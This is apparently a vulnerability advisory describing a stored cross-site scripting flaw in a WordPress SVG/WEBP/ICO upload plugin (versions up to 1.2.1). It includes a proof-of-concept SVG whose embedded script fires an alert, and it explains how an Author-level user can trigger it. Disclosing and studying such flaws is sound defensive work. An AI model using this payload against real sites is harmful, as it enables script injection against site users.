## WordPress Plugin Vulnerabilities

# Uploading SVG, WEBP and ICO files <= 1.2.1 - Author+ Stored XSS via SVG

### Description

The plugin does not sanitise uploaded SVG files, which could allow users with a role as low as Author to upload a malicious SVG containing XSS payloads.

### Proof of Concept

As an author, upload an SVG file with malicious JavaScript:
```
<svg xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#089900" stroke= "#004400"/>
<script type="text/javascript">alert("pwned by daniloalbugrque");</script>
</svg>
```
Access the file through its URL to see XSS.
